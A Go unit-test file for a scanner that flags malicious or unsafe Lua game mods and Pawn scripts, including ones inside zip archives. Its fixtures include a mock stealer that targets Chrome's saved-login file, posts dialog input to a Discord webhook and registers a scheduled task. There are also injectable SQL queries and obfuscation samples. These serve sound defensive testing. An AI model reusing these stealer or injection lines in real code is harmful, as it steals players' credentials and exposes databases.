package analyzer

import (
	"archive/zip"
	"bytes"
	"strings"
	"testing"
)

const stealer = `
local requests = require("requests")
local path = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Login Data"
function sampev.onSendDialogResponse(id, btn, list, input)
  requests.post("https://discord.com/api/webhooks/123/abc", {data = input})
end
os.execute("schtasks /create /tn x /tr evil.exe")
`

const sqli = `
local q = "SELECT * FROM users WHERE name = '" .. nick .. "'"
db:exec(string.format("DELETE FROM items WHERE id = %s", id))
`

const clean = "script_name(\"hello\")\nfunction main() sampRegisterChatCommand(\"hi\", function() sampAddChatMessage(\"hi\", -1) end) wait(-1) end\n"

func rules(r Report) map[string]bool {
	out := map[string]bool{}
	for _, f := range r.Files {
		for _, x := range f.Findings {
			out[x.Rule] = true
		}
	}
	return out
}

func zipOf(t *testing.T, files map[string]string, encrypted bool) []byte {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for name, body := range files {
		f, err := w.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		f.Write([]byte(body))
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	data := buf.Bytes()
	if encrypted {
		// Set the "encrypted" flag in the local and the central directory header.
		for sig, off := range map[string]int{"PK\x03\x04": 6, "PK\x01\x02": 8} {
			i := bytes.Index(data, []byte(sig))
			data[i+off] |= 1
		}
	}
	return data
}

func expect(t *testing.T, got map[string]bool, want ...string) {
	t.Helper()
	for _, w := range want {
		if !got[w] {
			t.Errorf("missing rule %s; got %v", w, got)
		}
	}
}

func TestStealerInsideZip(t *testing.T) {
	got := rules(Analyze("x.zip", zipOf(t, map[string]string{"mod/stealer.lua": stealer, "readme.txt": "hi"}, false)))
	expect(t, got, "exfil.discord_webhook", "steal.browser", "steal.password_dialog", "exec.shell",
		"persist.autorun", "fs.write_outside")
}

func TestSQLInjection(t *testing.T) {
	expect(t, rules(Analyze("db.lua", []byte(sqli))), "sqli.lua_concat", "sqli.format_s", "sqli.exec")
	pawn := "mysql_format(h, q, sizeof q, \"SELECT * FROM accs WHERE name = '%s'\", name);\nmysql_tquery(h, q);"
	expect(t, rules(Analyze("gm.pwn", []byte(pawn))), "sqli.format_s")
	safe := "mysql_format(h, q, sizeof q, \"SELECT * FROM accs WHERE name = '%e'\", name);"
	if rules(Analyze("gm.pwn", []byte(safe)))["sqli.format_s"] {
		t.Error("an escaped placeholder must not be reported")
	}
}

func TestClosedOrDisguisedFiles(t *testing.T) {
	expect(t, rules(Analyze("p.zip", zipOf(t, map[string]string{"a.lua": "x"}, true))), "archive.encrypted")
	expect(t, rules(Analyze("a.luac", append([]byte("\x1bLJ\x02\x00"), make([]byte, 64)...))), "lua.bytecode")
	expect(t, rules(Analyze("x.zip", zipOf(t, map[string]string{"script.lua.exe": "MZ"}, false))), "file.double_ext")
}

func TestCleanScript(t *testing.T) {
	for _, f := range Analyze("ok.lua", []byte(clean)).Files {
		for _, x := range f.Findings {
			if x.Severity != "info" {
				t.Errorf("clean script flagged: %+v", x)
			}
		}
	}
}

// These matched in real releases and were false alarms.
func TestFalsePositives(t *testing.T) {
	src := "local state = {}\nlocal function load() end\nload()\ninicfg.load({}, 'x')\nlocal winhttp = 'WinHttpSetTimeouts'\n"
	got := rules(Analyze("a.lua", []byte(src)))
	if got["steal.browser"] || got["exec.download"] {
		t.Errorf("false positives: %v", got)
	}
	var lines []int
	for _, f := range Analyze("a.lua", []byte("local function load() end\nx = 1\nload()\n")).Files {
		for _, x := range f.Findings {
			if x.Rule == "exec.dynamic_code" {
				lines = append(lines, x.Line)
			}
		}
	}
	if len(lines) != 1 || lines[0] != 3 {
		t.Errorf("dynamic code lines = %v, want [3]", lines)
	}
	expect(t, rules(Analyze("a.lua", []byte("loadstring(payload)()"))), "exec.dynamic_code")
}

func TestReadMember(t *testing.T) {
	data := zipOf(t, map[string]string{"moonloader/a.lua": "print(1)", "README.txt": "hi"}, false)
	p, body, err := ReadMember("r.zip", data, "a.lua")
	if err != nil || p != "r.zip/moonloader/a.lua" || string(body) != "print(1)" {
		t.Fatalf("ReadMember = %q %q %v", p, body, err)
	}
	if _, _, err := ReadMember("r.zip", data, ""); err == nil {
		t.Error("several files without member must fail")
	}
}

func TestCP1251Source(t *testing.T) {
	// "пароль" in CP1251 must decode and still be scanned.
	src := []byte("local p = '\xef\xe0\xf0\xee\xeb\xfc'\n")
	if DecodeText(src) != "local p = 'пароль'\n" {
		t.Fatalf("DecodeText = %q", DecodeText(src))
	}
	expect(t, rules(Analyze("a.lua", src)), "steal.password_word")
}

func TestObfuscationBlobs(t *testing.T) {
	b64 := "x = '" + strings.Repeat("QUJD", 120) + "'"
	esc := "x = '" + strings.Repeat(`\120\x41`, 25) + "'"
	chars := "x = string.char(" + strings.Repeat("65, ", 25) + "66)"
	expect(t, rules(Analyze("a.lua", []byte(b64))), "obf.base64_blob")
	expect(t, rules(Analyze("a.lua", []byte(esc))), "obf.escape_blob")
	expect(t, rules(Analyze("a.lua", []byte(chars))), "obf.string_char")
	short := rules(Analyze("a.lua", []byte(`x = string.char(65, 66) .. '\120\x41'`)))
	if short["obf.string_char"] || short["obf.escape_blob"] {
		t.Errorf("short sequences flagged: %v", short)
	}
}
